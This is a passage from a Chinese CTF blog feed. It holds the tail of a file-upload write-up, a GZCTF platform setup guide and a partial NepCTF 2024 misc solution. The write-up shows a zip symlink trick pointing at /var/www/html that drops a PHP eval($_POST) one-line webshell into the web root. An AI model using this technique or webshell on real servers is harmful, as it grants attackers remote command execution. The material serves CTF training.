id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>代码做了一个简单的限制，要求的zip文件，这也是一个提示我们需要上传zip文件。</p><p>执行命令，在&#x2F;tmp目录下解压文件内容，这里-o是强覆盖，会覆盖名称一样的文件</p><p>众所周知，正常环境的代码需要在&#x2F;var&#x2F;www&#x2F;html下才能执行那题目固定了在tmp下，所以我们要尝试建立tmp和&#x2F;var&#x2F;www&#x2F;html的联系，这里就考察了软链接的知识点。<a href="https://www.bilibili.com/video/BV16Q4y1y7xS/?p=33">详细教学</a>，可以看这个视频，我们可以通过建立一个软链接先指向，再解压，就可以再&#x2F;var&#x2F;www&#x2F;html有shell了。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>首先创建软链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /var/www/html orange<br></code></pre></td></tr></table></figure><p>然后进行第一次压缩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip --symlinks orange1.zip orange<br></code></pre></td></tr></table></figure><p>symlinks的作用是不把orange这个软链接当作普通的文件，而是当作指向目录或者文件的存在</p><p>写一个一句话木马在shell.php下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后保存在orange目录下，执行第二次压缩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip -r orange2.zip orange<br></code></pre></td></tr></table></figure><p>先上传orange1.zip，进行在靶场上执行的就是解压进行了链接</p><p>再上传orange2.zip，这次解压把shell.php解压到了orange的目录下，成功的把shell.php传到了&#x2F;var&#x2F;www&#x2F;html目录下</p><p>打开shell.php，执行命令</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-02203229.png" alt="2024-09-02 203229"></p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次GZCTF搭建及动态容器</title>
    <link href="/2024/09/02/%E6%9D%82%E8%B0%88/%E8%AE%B0%E4%B8%80%E6%AC%A1GZCTF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8/"/>
    <url>/2024/09/02/%E6%9D%82%E8%B0%88/%E8%AE%B0%E4%B8%80%E6%AC%A1GZCTF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>前言：因为学校需要招新生要搭建平台，简单的学习了一下。</p><h1 id="GZCTF配置"><a href="#GZCTF配置" class="headerlink" title="GZCTF配置"></a>GZCTF配置</h1><p>环境 ubuntu 22.04</p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>更新源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt update <br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/update.png" alt="update"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>安装docker和docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install docker.io docker-compose<br></code></pre></td></tr></table></figure><p>中途按Y和Enter即可。</p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>docker换源</p><p>由于docker今年在中国地区的限制，需要换源才能正常的拉取。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/docker<br>sudo <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>        <span class="hljs-string">&quot;https://do.nark.eu.org&quot;</span>,<br>        <span class="hljs-string">&quot;https://dc.j8.work&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.m.daocloud.io&quot;</span>,<br>        <span class="hljs-string">&quot;https://dockerproxy.com&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.nju.edu.cn&quot;</span><br>    ]<br>&#125;<br>EOF<br>sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>配置文件appsettings.json和docker-compose.yml，可以新建GZCTF，然后将这两个文件放在这里</p><p>appsettings.json是环境的核心</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;AllowedHosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ConnectionStrings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Database&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=这里填写数据库密码&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;EmailConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;SendMailAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a@a.com&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Smtp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;localhost&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;Port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">587</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;XorKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;asdqwe&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ContainerProvider&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Docker&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;Kubernetes&quot;</span><br>      <span class="hljs-attr">&quot;PortMappingType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Default&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;PlatformProxy&quot;</span><br>      <span class="hljs-attr">&quot;EnableTrafficCapture&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;PublicEntry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;xx.xx.xx.xx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//服务器官网ip</span><br>      <span class="hljs-comment">// optional</span><br>      <span class="hljs-attr">&quot;DockerConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;SwarmMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;Uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;unix:///var/run/docker.sock&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;RequestLogging&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;DisableRateLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;RegistryConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;ServerAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;CaptchaConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Provider&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;CloudflareTurnstile&quot; or &quot;GoogleRecaptcha&quot;</span><br>      <span class="hljs-attr">&quot;SiteKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;Your SITE_KEY&gt;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;SecretKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;Your SECRET_KEY&gt;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-comment">// optional</span><br>      <span class="hljs-attr">&quot;GoogleRecaptcha&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;VerifyAPIAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;RecaptchaThreshold&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.5&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ForwardedOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;ForwardedHeaders&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;ForwardLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;TrustedNetworks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>上面的内容对于邮箱的验证没有填写，你需要填写<strong>数据库的密码</strong>，如果使用服务器的换填写服务器的ip，完全的功能请参照<a href="https://docs.ctf.gzti.me/zh/config/appsettings">GZCTF官方文档</a>。</p><p>docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;3.0&quot;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">gzctf:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">gztime/gzctf:latest</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;GZCTF_ADMIN_PASSWORD=这里填管理员密码&quot;</span><br>      <span class="hljs-comment"># choose your backend language `en_US` / `zh_CN` / `ja_JP`</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;LC_ALL=zh_CN.UTF-8&quot;</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:8080&quot;</span> <span class="hljs-comment">#如果备案了可以选择80</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/files:/app/files&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span><br>      <span class="hljs-comment"># - &quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot; # this is required for k8s deployment</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span> <span class="hljs-comment"># this is required for docker deployment</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br> <br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:alpine</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;POSTGRES_PASSWORD=数据库密码&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/db:/var/lib/postgresql/data&quot;</span><br></code></pre></td></tr></table></figure><p>这里填写管理员密码，数据库密码(<strong>必须个上一个的保持一致</strong>),端口看情况进行修改。</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/%E9%85%8D%E7%BD%AE.png" alt="配置"></p><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h2><p>拉取docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/docker.png" alt="docker"></p><p>等出现两个done之后就完成了，访问一下网页</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/%E7%BD%91%E9%A1%B5.png" alt="网页"></p><h1 id="动态容器出题"><a href="#动态容器出题" class="headerlink" title="动态容器出题"></a>动态容器出题</h1><p>我用的是探姬和巨魔师傅的项目，这里贴一下。<a href="https://github.com/CTF-Archives/ctf-docker-template">项目</a></p><p>正常的题型直接更换src就行了,我用的xftp上传到服务器，最后docker 拉取一下就行，这里以web题目为例子。</p><p>默认的网页是index需要注意一下。</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/%E4%BE%8B%E9%A2%98.png" alt="例题"></p><p>这是准备好的例题，然后我们使用xftp上传到服务器上</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/1.png" alt="1"></p><p>弄好之后创建比赛，选个web题动态容器，输入webtest就行，然后测试一下。</p><p>有dockerhub的也可以选择先传到那上面，看自己的选择。</p><h1 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h1><p>1.探姬项目的pwn题目默认是9999端口需要自己改一下</p><p>2.环境不能上传内容过大的附件，可以先上传网盘，再把链接贴上去。</p><p>3.流量抓捕我并没有设置，当时也忘了，等明年再说吧，详情也可以看官方文档</p><p>4.弄不好可以全删重新弄，orz，好事多磨。</p>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nepctf2024复盘</title>
    <link href="/2024/08/28/nepctf/nepctf2024/"/>
    <url>/2024/08/28/nepctf/nepctf2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Nemophila"><a href="#Nemophila" class="headerlink" title="Nemophila"></a>Nemophila</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;提示：宝箱怪只会提示你口令正确与否，请你试试吧！&quot;</span>)<br>flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Turn in your guess: &#x27;</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) !=<span class="hljs-number">48</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;长度不对！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(flag.capitalize()[<span class="hljs-number">0</span>]) != <span class="hljs-number">83</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> flag[<span class="hljs-number">0</span>].islower():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> flag[-<span class="hljs-number">3</span>:] != <span class="hljs-string">&quot;ve&#125;&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> flag.count(<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)) != <span class="hljs-number">4</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> base64.b64encode((flag[<span class="hljs-number">10</span>:<span class="hljs-number">13</span>]+flag[<span class="hljs-number">28</span>:<span class="hljs-number">31</span>]).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode() != <span class="hljs-string">&#x27;RnJpSGlt&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(flag[<span class="hljs-number">24</span>:<span class="hljs-number">26</span>]) &gt; <span class="hljs-number">10</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(flag[<span class="hljs-number">24</span>:<span class="hljs-number">26</span>]) &lt; <span class="hljs-number">20</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>(flag[<span class="hljs-number">24</span>:<span class="hljs-number">26</span>]),<span class="hljs-number">2</span>,<span class="hljs-number">5</span>) != <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;好像有点不对！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br>number = flag[<span class="hljs-number">33</span>] + flag[<span class="hljs-number">41</span>] + flag[<span class="hljs-number">43</span>:<span class="hljs-number">45</span>]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(number) * <span class="hljs-number">9_27</span> != <span class="hljs-number">1028970</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> number.isnumeric():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;还是不对呢！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> flag[<span class="hljs-number">35</span>:<span class="hljs-number">41</span>].replace(<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>) != <span class="hljs-string">&quot;1t1rna&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> flag[<span class="hljs-number">31</span>:<span class="hljs-number">33</span>].swapcase() != <span class="hljs-string">&quot;ME&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这不是我!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">len</span>,flag.split(<span class="hljs-string">&quot;_&quot;</span>))) != [<span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>] <span class="hljs-keyword">and</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">len</span>,flag.split(<span class="hljs-string">&quot;&amp;&quot;</span>))) != [<span class="hljs-number">17</span>, <span class="hljs-number">9</span>, <span class="hljs-number">20</span>]:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;换个顺序！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">min</span>(flag[:<span class="hljs-number">2</span>].swapcase())) != <span class="hljs-number">69</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> flag[<span class="hljs-number">2</span>] + flag[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] != <span class="hljs-string">&quot;cet4&quot;</span>[:<span class="hljs-number">3</span>]:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我不想考四级！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br>new=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag[<span class="hljs-number">7</span>:<span class="hljs-number">10</span>] + flag[<span class="hljs-number">18</span>] + flag[<span class="hljs-number">26</span>]: new += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i) + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> new != <span class="hljs-string">&quot;jt|Df&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;SunR&quot;</span> <span class="hljs-keyword">in</span> flag <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;eren&quot;</span> <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;好像对了！可以先去试试！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！&quot;</span>)<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment"># 补全</span><br>flag = <span class="hljs-string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><br><span class="hljs-comment"># 将字符串转换为列表</span><br>flag_list = <span class="hljs-built_in">list</span>(flag)<br>flag_list[<span class="hljs-number">0</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">83</span>).lower()<br><br>flag_list[-<span class="hljs-number">3</span>:] = <span class="hljs-string">&quot;ve&#125;&quot;</span><br><span class="hljs-comment"># base64解密带入</span><br>base64_code = <span class="hljs-built_in">list</span>(base64.b64decode(<span class="hljs-string">&quot;RnJpSGlt&quot;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>flag_list[<span class="hljs-number">10</span>:<span class="hljs-number">13</span>] = base64_code[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]<br>flag_list[<span class="hljs-number">28</span>:<span class="hljs-number">31</span>] = base64_code[<span class="hljs-number">3</span>:]<br><span class="hljs-comment"># 